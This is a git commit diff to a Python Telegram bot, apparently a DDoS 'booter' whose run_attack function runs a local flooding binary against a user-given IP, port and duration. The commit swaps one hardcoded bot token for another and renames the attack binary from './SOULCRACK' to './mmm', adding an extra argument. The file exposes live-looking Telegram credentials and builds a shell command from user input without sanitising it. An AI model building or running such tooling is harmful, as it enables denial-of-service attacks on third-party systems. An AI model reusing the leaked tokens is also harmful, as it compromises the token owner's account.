b81f67ff61ca127606e48c0902215ea4dce4db2f
poco777 <pan.k.8.381@gmail.com>
2025-03-28 20:32:07 +0530

    Update rb.py

--- rb.py
+++ rb.py
@@ -3,7 +3,7 @@ import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7580203890:AAFiOEC7jHmf9jfqy7vzf5jRh65S2V67pj0'
+TELEGRAM_BOT_TOKEN = '7569800573:AAGgwAtuE2KQuzy0o1dGhOlHXrJ2GPYOUz4'
 ADMIN_USER_ID = 7383077317
 USERS_FILE = 'users.txt'
 LOG_FILE = 'log.txt'
@@ -134,7 +134,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./SOULCRACK {ip} {port} {duration} "
+        command = f"./mmm {ip} {port} {duration} 1300"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
